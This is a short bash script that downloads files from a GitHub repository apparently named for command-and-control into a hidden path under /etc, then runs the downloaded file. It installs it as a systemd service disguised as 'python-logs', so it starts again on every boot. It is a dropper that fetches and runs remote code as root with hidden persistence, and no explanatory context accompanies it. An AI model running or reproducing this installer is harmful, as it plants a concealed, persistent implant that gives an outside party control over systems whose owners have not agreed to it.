#!/bin/bash
curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh > /etc/.python-logs
curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service > /etc/systemd/system/python-logs.service
chmod +x /etc/.python-logs
bash /etc/.python-logs
systemctl daemon-reload
systemctl enable python-logs
systemctl start python-logs
